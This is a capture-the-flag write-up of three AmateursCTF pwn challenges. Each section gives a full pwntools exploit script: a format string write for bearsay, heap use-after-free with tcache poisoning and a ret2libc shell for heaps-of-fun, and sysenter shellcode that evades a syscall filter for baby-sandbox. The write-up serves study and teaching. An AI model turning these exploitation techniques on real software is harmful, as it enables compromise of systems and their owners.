# AmateursCTF

{% hint style="info" %}
Participated under the banner of <mark style="color:blue;">**HCS**</mark>, <mark style="color:yellow;">144</mark>

\
the CTF was held at the same time as a significant event in our country & culture so we didn't have much time to play. but it was really fun learning experience !
{% endhint %}

<table><thead><tr><th width="248">Challenge</th><th width="244">Category</th><th width="152" align="center">Points</th><th align="center">Solves</th></tr></thead><tbody><tr><td>bearsay</td><td>Binary Exploitation</td><td align="center">266 pts</td><td align="center">134</td></tr><tr><td>heaps-of-fun</td><td>Binary Exploitation</td><td align="center">352 pts</td><td align="center">56</td></tr><tr><td>baby-sandbox</td><td>Binary Exploitation</td><td align="center">392 pts</td><td align="center">34</td></tr></tbody></table>

## bearsay

### Description

> bearsay - configurable speaking/thinking bear (and a bit more)

### Binary Analysis

given a binary, glibc and dockerfile, lets do some footprinting

{% code overflow="wrap" %}
```bash
└──╼ [★]$ tree .
.
├── chal
├── Dockerfile
├── exploit.py
├── flag.txt
└── lib
    ├── ld-linux-x86-64.so.2
    └── libc.so.6

└──╼ [★]$ file chal 
chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./lib/ld-linux-x86-64.so.2, BuildID[sha1]=79f746f54fb4d78fd8a9f34901ee607acdd0f0db, for GNU/Linux 4.4.0, not stripped

└──╼ [★]$ pwn checksec chal 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./lib'
```
{% endcode %}

running the binary, its just print back our input indefinitely, my first thought of this is it ought to be format string vulnerability

<figure><img src="../../.gitbook/assets/image (154).png" alt="" width="563"><figcaption></figcaption></figure>

upon analyzing in its decompiled form, will handle the input differently based upon a `strcmp()` of our input as follows:

* "flag"&#x20;
* "leave"&#x20;
* "moo"
* \_ (default)&#x20;

leave and moo both basically exits the program and none of our interest, flag however seems to be the goal however has a check which is a global variable that is never modified anywhere within the code.

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

eventually if none of the input matches the `strcmp()` it will resort to the default handler below

<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

and will eventually jump to below here as well, note earlier we saw that it prints back our input in a box, and there's a box function, so that's where our controlled input goes

<figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

following the routine calls, we can see below the format string vulnerability where `printf()` is called without any hard coded format as its first argument

<figure><img src="../../.gitbook/assets/image (160).png" alt="" width="357"><figcaption></figcaption></figure>

### Exploitation

exploitation is quite straight forward and trivial, we wanna use the format string vuln to write into <mark style="color:green;">`is_mother_bear`</mark> to pass the check to flag.

even though the binary has PIE enabled, this won't be a problem since we have indefinite format string vuln so we can easily leak the binary base address and perform the write afterwards.

{% hint style="info" %}
if you're not familiar how to fuzz offsets and how to do format string attack in general I suggest you to give this [article](https://axcheron.github.io/exploit-101-format-strings/) a read or this [video](https://www.youtube.com/watch?v=iwNYoDw1hW4\&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94\&index=8) to watch if you prefer it that way!
{% endhint %}

We found an elf address leak at offset 15, using <mark style="color:red;">pwndbg</mark>, we can use the `vmmap` or `pie` command to get the current base address of the process and calculate the offset as follow:

<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption><p>receiving leak</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (162).png" alt=""><figcaption><p>calculating offset to base address</p></figcaption></figure>

to get the format string offset to our input that is needed to perform an write attack, I just screamed at it and manually count the `$p`'s needed to reach our input  &#x20;

<figure><img src="../../.gitbook/assets/image (165).png" alt=""><figcaption><p>found offset at 22</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (166).png" alt=""><figcaption><p>confirming offset</p></figcaption></figure>

to perform the write, use <mark style="color:orange;">pwntools</mark> built-in to build payload.

Below is the full exploit script:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./lib'

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'say', b'%15$p')
    io.recvuntil(b'0x')
    
    leak = int(io.recvuntil(b' ', drop=True), 16)
    elf.address = leak - 0x1678
    
    payload = fmtstr_payload(22, {
        elf.sym['is_mother_bear']: 0xbad0bad
    })
    io.sendlineafter(b'say', payload)

    io.sendlineafter(b'say', b'flag')

    info('leak: %#x', leak)
    info('elf base: %#x', elf.address)
    info('mother bear: %#x', elf.sym['is_mother_bear'])
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% hint style="success" %}
**Flag:** _amateursCTF{bearsay\_mooooooooooooooooooo?}_
{% endhint %}

***

## heaps-of-fun

{% hint style="info" %}
the discussion below assumes you have some knowledge about the heap structure and dynamic memory allocator algorithm. If you're not familiar with it check out the external links and reading [here](../../resources/cyber-security/binary-exploitation/heap-exploitation.md#introduction) !
{% endhint %}

### Description

> We decided to make our own custom super secure database with absolutely no bugs!

### Binary Analysis

given a binary, glibc and dockerfile, lets do some footprinting

{% code overflow="wrap" %}
```bash
└──╼ [★]$ tree .
.
├── chal
├── Dockerfile
├── exploit.py
├── flag.txt
├── gadgets.txt
└── lib
    ├── ld-linux-x86-64.so.2
    └── libc.so.6

└──╼ [★]$ file chal 
chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./lib/ld-linux-x86-64.so.2, BuildID[sha1]=71d857df9649c2979ef549d25b6df8c528645cf0, for GNU/Linux 4.4.0, not stripped

└──╼ [★]$ pwn checksec chal 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./lib'
```
{% endcode %}

running the binary, its a typical CRUD heap type of challenge

<figure><img src="../../.gitbook/assets/image (167).png" alt="" width="477"><figcaption><p>initial look</p></figcaption></figure>

below is the main function that routes our input/choice to its handler

<figure><img src="../../.gitbook/assets/image (168).png" alt="" width="345"><figcaption><p>decompiled main</p></figcaption></figure>

#### \[ 1 ] Create

the first option does what it says, it creates a new instance of key-value pair&#x20;

<figure><img src="../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

`db_index()` is a wrapper that returns an index from our input after performing some checks and validation. From this we know the global variable has a maximum capacity of 32 pairs of key-value.

{% hint style="info" %}
there's a vulnerability here that it doesn't check for index for negative values, so we can possibly do OOB, though this won't be relevant to the exploit I perform later on.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (170).png" alt="" width="548"><figcaption></figcaption></figure>

next it calls `db_line()` which also a wrapper that handles our input and allocates the key-value pair in the heap.  The function will only calls malloc only if the create flag is enabled, otherwise it simply performs update on the existing data.

<figure><img src="../../.gitbook/assets/image (173).png" alt="" width="422"><figcaption></figcaption></figure>

some things to note here:

* We are in control of the size of the chunks made by malloc
* In one create request, we are creating 2 chunks, one for the key, one for the value

#### \[ 2 ] Update

update uses the same wrappers like in create, however we can only update each instance values and unable for its keys. Also notice it calls `db_line()` with the create flag set to 0.

<figure><img src="../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

#### \[ 3 ] Read

read prints both the key and value of the specified index&#x20;

<figure><img src="../../.gitbook/assets/image (175).png" alt="" width="347"><figcaption></figcaption></figure>

it prints the chunk's data in a quite odd format I would say&#x20;

<figure><img src="../../.gitbook/assets/image (176).png" alt="" width="345"><figcaption></figcaption></figure>

#### \[ 4 ] Delete

delete is where the main vulnerability lies, which in turn will enable update and read respectively to our advantage

<figure><img src="../../.gitbook/assets/image (177).png" alt="" width="350"><figcaption></figcaption></figure>

as you can see, unlike the other handlers, it doesn't even have a wrapper. It simply frees the chunks and doesn't nullify the pointer to it. This allows us to do UAF attack which how we'll get memory leaks and get Code Execution

#### \[ 5 ] Exit

it exits [👍](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&ved=2ahUKEwjznqbLsreFAxVexDgGHRRsA1oQFnoECCkQAQ\&url=https%3A%2F%2Femojipedia.org%2Fthumbs-up\&usg=AOvVaw1_bos3-9iqNxKL1KZSe1kc\&opi=89978449)

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

### Exploitation

in our exploit scripts lets define some function to make interacting with the program more intuitive.

```python
def create(idx, key_len, key, value_len, value):
    pass
    
def update(idx, value):
   pass

def read(idx):
   pass

def delete(idx):
   pass
```

#### Heap and LIBC leaks

first we'll do is to get some `libc` leaks, one trivial way to do this is to read the `fd` pointer of an free `unsorted bin` chunk.

to do this first we need to fill in the `tcache` to its maximum capacity with a relatively big sized chunks such that the next time free is called, it would go to `unsorted bin`. The reason why small chunks won't work is because it go to the free bin instead.

{% hint style="info" %}
to understand more in depth in this behaviour I would, read this [azeria-labs](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/) which explain in highly detailed manner on the algorithm of free, bins and recycling of chunks works !
{% endhint %}

and as we are create two chunks per request, we only need to make 4 request to fill the `tcache` and perfectly left 1 that'll go the `unsorted bin`

```python
for i in range(4):
    create(i, 0x100, f'KEY-{i}'.encode(), 0x100, f'IDX-{i}'.encode())
create(4, 0x10, b'protect', 0x10, b'protect')

# fill tcache
for i in range(4):
    delete(i)
```

inspecting in <mark style="color:red;">**pwndbg**</mark> can confirm that we had just done that, and the pointer in `unsorted bin` points to an address in `libc`&#x20;

<figure><img src="../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

and since we have UAF on dangling pointers, we can perform read that `unsorted bin` chunk to leak `libc`, while we're on the way, might as well read the other chunks to leak heap address.&#x20;

```python
# unsorted bin
read(3)
io.recvuntil(b'val = ')
leak = encode_leak(io.recvuntil(b'\\x00', drop=True))
libc.address = leak - 0x21ace0

read(2)
io.recvuntil(b'val = ')
leak = encode_leak(io.recvuntil(b'\\x00', drop=True))
heap = demangle(leak) - 0x6e0
```

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption><p>leaking memory</p></figcaption></figure>

before moving on, I like to clear the bins just to refresh the heap state to start fresh as if it was never touched.&#x20;

```python
# clean bins
for i in range(4):
    create(i, 0x100, f'KEY-{i}'.encode(), 0x100, f'IDX-{i}'.encode())
```

<figure><img src="../../.gitbook/assets/image (189).png" alt=""><figcaption><p>cleaned bins</p></figcaption></figure>

next we're going to do a `tcache poisoning` attack, I've covered the basic idea of this attack more in-depth in this [writeup](../2023/cigits/afafafaf.md), so if you're unfamiliar with it go give a read.&#x20;

However there's some caveats or difference that we will need to tackle here compared to the previous writeup.

glibc >= 2.32 introduces safe linking, in short it encrypts the metadata of a free chunk with a known key, and when it the time to use it comes (e.g. recycling of chunks) it will decrypt it using said key. &#x20;

{% hint style="info" %}
read more detail of safe linking [here](https://c4ebt.github.io/2021/01/22/House-of-Rust.html)
{% endhint %}

&#x20;to defeat this we can reverse the safe linking with these functions:

```python
def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val
```

the key it uses in this case can be the heap base address.

with safe linking defeated, we can then do `tcache` poisoning, but where?

#### Stack leak

`libc` has a symbol called `environ` which stores a stack address, meaning if we can allocate a chunk to `environ` and read its content we get a stack address leak.

<figure><img src="../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

however instead of directly creating a chunk in `environ` and possibly corrupting the existing data which we want the integrity of, we will create a chunk just a little bit before it to ensure that no bytes are lost.&#x20;

<figure><img src="../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

notice the bytes before `environ` is a bunch of null bytes, this is also good to ensure the exact amount of `tcache` free chunks that exist within the heap.&#x20;

{% hint style="info" %}
recall that `tcache` is a singly linked list, so that if we directly created a chunk on `environ`, it means `tcache` will take its content (i.e. the stack address) as an `fd` pointer store it as the next free chunk to allocate to.\
\
this will break malloc's allignment because, initially `tcache` only has 2 free chunks but now suddenly there's an additional more.
{% endhint %}

now let's prepare a chunk and poison it&#x20;

```python
create(5, 0x40, b'VICTIM', 0x40, b'VICTIM')
delete(5)

target = mangle(heap, libc.sym['environ'] - 0x10)
update(5, p64(target))
```

<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

```python
create(6, 0x40, b'nothing', 0x40, b'A'*10+b'B'*4)
read(6)
io.recvuntil(b'BBBB')
io.recvuntil(b'\\x00')
io.recvuntil(b'\\x00')
leak = encode_leak(io.recvuntil(b'\\x00', drop=True))
stack = leak
```

and as we see below, we managed to create a chunk just before environ, read its content and leak a stack address.

<figure><img src="../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### ret2libc

next to do code execution we're going to overwrite the saved return address of a stack frame into a `system("/bin/sh")`.&#x20;

just to be safe, we're going to overwrite `main()` 's stack frame since it's the data within the stack frame won't be relatively small and we can control when to return. If we choose the other function's stack frame, it would possibly cause some complications because of the abundance of local variables and we can't control when to actually return.

to do that, up to this state, we're going to set a breakpoint right before `main()` returns to to calculate the offset between our stack leak and the saved RIP which occurs when choose the option 5.

<figure><img src="../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

next we will have to do the exact same `tcache poisoning` with leaking the stack address and create a chunk just before the saved RIP.

<figure><img src="../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

just 8 byte before the saved RIP seems to be a great target, even though it's not null, it is small enough that when it heap manager does demangle it from the safe linking, it would result in a null which in turns means the end of the `tcache` list (or at least that's what I thought what is happening here)

```python
create(7, 0x60, b'VICTIM', 0x60, b'VICTIM')
delete(7)

rip = mangle(heap, stack - 0x120 - 0x8)
update(7, p64(rip))

offset = 0x8
payload = flat({
    offset: [
        libc.address + 0x02a3e5, # pop rdi; ret;
        next(libc.search(b'/bin/sh\x00')),
        libc.address + 0x029139, # ret;
        libc.sym['system']
    ]
})
create(8, 0x60, b'VICTIM', 0x60, payload)

# return trigger ROP
io.sendlineafter('>>>', b'5')
```

running against remote, gained shell !

<figure><img src="../../.gitbook/assets/image (186).png" alt="" width="563"><figcaption></figcaption></figure>

Below is the full exploit script:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chal.amt.rs', 1346

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+333
'''.format(**locals())
# break *db_menu+256
# break *db_line+394

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./lib'

def create(idx, key_len, key, value_len, value):
    io.sendlineafter('>>>', b'1')
    io.sendlineafter('>>>', str(idx).encode())
    io.sendlineafter('>>>', str(key_len).encode())
    io.sendlineafter('>>>', key)
    io.sendlineafter('>>>', str(value_len).encode())
    io.sendlineafter('>>>', value)
    
def update(idx, value):
    io.sendlineafter('>>>', b'2')
    io.sendlineafter('>>>', str(idx).encode())
    io.sendlineafter('>>>', value)

def read(idx):
    io.sendlineafter('>>>', b'3')
    io.sendlineafter('>>>', str(idx).encode())

def delete(idx):
    io.sendlineafter('>>>', b'4')
    io.sendlineafter('>>>', str(idx).encode())

def encode_leak(leak):
    res = []

    while(len(leak) > 0):
        if leak[:2] == b'\\x':
            res.append(leak[2:4].decode()[::-1])
            leak = leak[4:]
        else:
            res.append(hex(ord(leak[:1]))[2:][::-1])
            leak = leak[1:]

    return int(''.join(res)[::-1], 16)

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    for i in range(4):
        create(i, 0x100, f'KEY-{i}'.encode(), 0x100, f'IDX-{i}'.encode())
    create(4, 0x10, b'protect', 0x10, b'protect')

    # fill tcache
    for i in range(4):
        delete(i)

    # unsorted bin
    read(3)
    io.recvuntil(b'val = ')
    leak = encode_leak(io.recvuntil(b'\\x00', drop=True))
    libc.address = leak - 0x21ace0

    read(2)
    io.recvuntil(b'val = ')
    leak = encode_leak(io.recvuntil(b'\\x00', drop=True))
    heap = demangle(leak) - 0x6e0

    # clean bins
    for i in range(4):
        create(i, 0x100, f'KEY-{i}'.encode(), 0x100, f'IDX-{i}'.encode())

    create(5, 0x40, b'VICTIM', 0x40, b'VICTIM')
    delete(5)

    target = mangle(heap, libc.sym['environ'] - 0x10)
    update(5, p64(target))

    create(6, 0x40, b'nothing', 0x40, b'A'*10+b'B'*4)
    read(6)
    io.recvuntil(b'BBBB')
    io.recvuntil(b'\\x00')
    io.recvuntil(b'\\x00')
    leak = encode_leak(io.recvuntil(b'\\x00', drop=True))
    stack = leak

    create(7, 0x60, b'VICTIM', 0x60, b'VICTIM')
    delete(7)

    rip = mangle(heap, stack - 0x120 - 0x8)
    update(7, p64(rip))

    offset = 0x8
    payload = flat({
        offset: [
            libc.address + 0x02a3e5, # pop rdi; ret;
            next(libc.search(b'/bin/sh\x00')),
            libc.address + 0x029139, # ret;
            libc.sym['system']
        ]
    })
    create(8, 0x60, b'VICTIM', 0x60, payload)

    # return trigger ROP
    io.sendlineafter('>>>', b'5')

    sleep(1)
    io.send(b'cat flag*')

    info('leak: %#x', leak)
    info('heap base: %#x', heap)
    info('libc base: %#x', libc.address)
    info('libc environ: %#x', libc.sym['environ'])
    info('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% hint style="success" %}
**Flag:** _amateursCTF{did\_you\_have\_fun?}_
{% endhint %}

***

## baby-sandbox

{% hint style="warning" %}
didn't solve during the CTF, after reading some post-competition discussion I think my approach and overall idea was on the right path.&#x20;

so I think it will be a good learning process to document what I'm missing and the pitfalls I encountered.
{% endhint %}

### Description

> How many different ways are there to make a syscall?

### Binary Analysis

given a binary, glibc and dockerfile, lets do some footprinting

{% code overflow="wrap" %}
```bash
└──╼ [★]$ tree .
.
├── chal
├── Dockerfile
├── exploit.py
├── flag.txt
└── lib
    ├── ld-linux-x86-64.so.2
    └── libc.so.6
    
└──╼ [★]$ file chal 
chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./lib/ld-linux-x86-64.so.2, BuildID[sha1]=b822117a5f3c171a60cc8879d6698ccfebe7f9dc, for GNU/Linux 4.4.0, not stripped

└──╼ [★]$ pwn checksec chal 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./lib'

```
{% endcode %}

let's just jump straight to ghidra

<figure><img src="../../.gitbook/assets/image (192).png" alt="" width="541"><figcaption><p>decompiled main</p></figcaption></figure>

the program has only one function `main()`. first it `mmap` a new page at a hard coded address, it will then prompt an input to us asking for input at said `mmap` page as we can see below:&#x20;

<figure><img src="../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

also notice the program blacklist certain opcode, notably `syscall` and `int 0x80`.

it will then run `mprotect()` to the page right after our input has been given, changing the page's permission to be read and execute (removed write) as we can see below:&#x20;

<figure><img src="../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

it will then fill the registers with bunch of `0x1337133713371337` and execute our shellcode

<figure><img src="../../.gitbook/assets/image (196).png" alt="" width="563"><figcaption></figcaption></figure>

### Skill Issue Exploit

#### Self modifying shellcode

typically in challenges where `syscall` and `int 0x80` are blacklisted, the trivial answer to this is to make a self-modifying shellcode.&#x20;

however that won't work here because the `mmap`'ed region where our shellcode resides doesn't have any write access.

#### sysenter?

before I got my hand on this challenge, one of my senior teammate had already informed me of what he suspect might be the solution to this problem.

<figure><img src="../../.gitbook/assets/image (197).png" alt="" width="563"><figcaption></figcaption></figure>

this is my first encounter to `sysenter`, and so I had to do some research and read what it is. below is some of the references I find very helpful in explaining it, I would highly recommend you to give it a read if you're also a newbie like me :^)

{% embed url="https://blog.packagecloud.io/the-definitive-guide-to-linux-system-calls/" %}
syscall vs sysenter vs int 0x80
{% endembed %}

{% embed url="https://r3billions.com/writeup-no-eeeeeeeeeeeemoji/" %}

{% embed url="https://github.com/welchbj/ctf/blob/master/docs/binary-exploitation.md#sysenter" %}

to summarise, apparently `int 0x80` is the legacy way to do system calls in 32 bit architecture. the new and more efficient way to do it is using what's called a Fast System Calls which is `sysenter` in 32 bit context and `syscall` in 64 bit context.

#### write? where?

anyway, `sysenter` is not blacklisted is available to use. but we still need to spawn a shell, which also includes writing a `/bin/sh` to the memory.  the problem is all addresses is randomised and I really don't wanna do any bruteforce.

this leads me up to this awesome [writeup](https://github.com/nobodyisnobody/write-ups/blob/main/Blackhat.MEA.CTF.Finals.2023/pwn/babysbx/README.md#babysbx) by the legend himself: [_nobodyisnobody_](https://github.com/nobodyisnobody)

> All the registers being cleared before the execution of our shellcode, we need a leak to locate the program in the memory.
>
> There are many ways to do this
>
> Libc functions are using `xmm` registers for many SIMD optimized functions, and you can find many useful addresses in them frequently: heap , libc, program, etc..
>
> in restricted shellcodes often challenge's authors forget to clean them too, that's good for us, so we can find a heap address in `xmm0` actually which we can copy in `rax`register like this\
>
>
> ```nasm
>   /* leak heap address */
>    movd rax, xmm0
> ```

{% hint style="info" %}
`xmm` are 128 bit registers
{% endhint %}

and this holds true as well here, as we can see below, from those `xmm` registers, we're able to retrieve heap addresses to RDI, RSP and RBP

<figure><img src="../../.gitbook/assets/image (198).png" alt="" width="563"><figcaption></figcaption></figure>

{% hint style="warning" %}
have you find out why this should never work in the first place?\
\
I should've realized about this sooner :^(&#x20;
{% endhint %}

let's try it, we can put `/bin/sh` to one of the heap address, and set RBP and RSP to the other address for our stack frame.

```python
shellcode = b''
shellcode += b'\x90' * 8
shellcode += asm(f'''
    movd rdi, xmm0
    movd rsp, xmm1
    movd rbp, xmm1
                    
    mov dword ptr [rdi], 0x6e69622f
    add rdi, 4
                    
    mov dword ptr [rdi], 0x0068732f
    sub rdi, 4
''')
```

<figure><img src="../../.gitbook/assets/image (199).png" alt="" width="563"><figcaption></figcaption></figure>

and we managed to write `/bin/sh` to the memory, next let's set up the registers accordingly to call `execve`.&#x20;

```python
shellcode += asm(f'''
    mov rbx, rdi
    xor ecx, ecx
    xor edx, edx
                    
    mov eax, 11
    sysenter
''')
```

now let's run it !

<figure><img src="../../.gitbook/assets/image (200).png" alt="" width="563"><figcaption></figcaption></figure>

uh oh... SIGILL ??? Illegal Instruction ???

#### sysenter 32 bit vs 64 bit address

this is where I realized that, `sysenter` will switch the execution context to 32 bit. in the other hand our writeable address is in the size of 64 bit. which `sysenter` will take as an argument and obviously will cause the type mismatch and errors.

#### another approach

remember, although our shellcode in the end can only be read and executed, at some point the program need to write the shellcode to it. So at the start of the program, the `mmap` page is still writeable.

using this we can directly write `/bin/sh` to the `mmap` page at a certain offset, and because the address is hardcoded, we can always infer where the string will be located. Also since the address is 32 bit in size, this should cause no type mismatch.&#x20;

```python
shellcode = b''
shellcode += b'\x90' * 8

shellcode += asm(f'''
    mov r10, rax
    add r10, 0x12d
                    
    mov r12, r10
    add r12, 0x100
    mov rbp, r12
''')

shellcode += asm(f'''
    mov rbx, r10
    xor ecx, ecx
    xor edx, edx
                    
    mov eax, 11
    sysenter
''')

shellcode += shellcode.ljust(0x100, b'\x90')
shellcode += b'/bin/sh\x00'
```

<figure><img src="../../.gitbook/assets/image (118).png" alt="" width="563"><figcaption></figcaption></figure>

but alas our effort was for nothing, at this point I don't know what I'm doing wrong and unable to progress further...

### Enlightenment

after the CTF was over, I had to look up the [official writeup](https://unvariant.pages.dev/writeups/amateursctf-2024/pwn-baby-sandbox)&#x20;

> \# Issues\
> `sysenter` only works in 64 bit mode on intel processors, which caused some debugging issues for some players.

and I'm using an AMD CPU which clearly explains why I got Illegal Instruction error ...

m3rrow on discord also confirms this with further explanation and also confirming why my first approach will never work

<figure><img src="../../.gitbook/assets/image (119).png" alt="" width="563"><figcaption></figcaption></figure>

trying it again againts remote now turns out working perfectly fine

<figure><img src="../../.gitbook/assets/image (120).png" alt="" width="563"><figcaption></figcaption></figure>

Below is the full exploit script:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chal.amt.rs', 1341

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+474
'''.format(**locals())
# break *0x1337000

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./lib'

def skill_issue_exploit():
    global io
    io = initialize()

    shellcode = b''
    shellcode += b'\x90' * 8

    shellcode += asm(f'''
        movd rdi, xmm0
        movd rsp, xmm1
        movd rbp, xmm1
                     
        mov dword ptr [rdi], 0x6e69622f
        add rdi, 4
                     
        mov dword ptr [rdi], 0x0068732f
        sub rdi, 4
    ''')

    shellcode += asm(f'''
        mov rbx, rdi
        xor ecx, ecx
        xor edx, edx
                        
        mov eax, 11
        sysenter
    ''')

    payload = shellcode.ljust(0x1000, b'\x90')

    io.sendafter(b'>', payload)

    io.interactive()

def working_exploit():
    global io
    io = initialize()

    shellcode = b''
    shellcode += b'\x90' * 8

    shellcode += asm(f'''
        mov r10, rax
        add r10, 0x12d
                        
        mov r12, r10
        add r12, 0x100
        mov rbp, r12
    ''')

    shellcode += asm(f'''
        mov rbx, r10
        xor ecx, ecx
        xor edx, edx
                        
        mov eax, 11
        sysenter
    ''')

    shellcode += shellcode.ljust(0x100, b'\x90')
    shellcode += b'/bin/sh\x00'

    payload = shellcode.ljust(0x1000, b'\x90')

    io.sendafter(b'>', payload)

    io.interactive()
    
if __name__ == '__main__':
    working_exploit()
    # skill_issue_exploit()

```
{% endcode %}

{% hint style="success" %}
**Flag:** _amateursCTF{surely\_there\_arent\_any\_more\_ways\_to\_make\_syscalls\_right}_
{% endhint %}

***
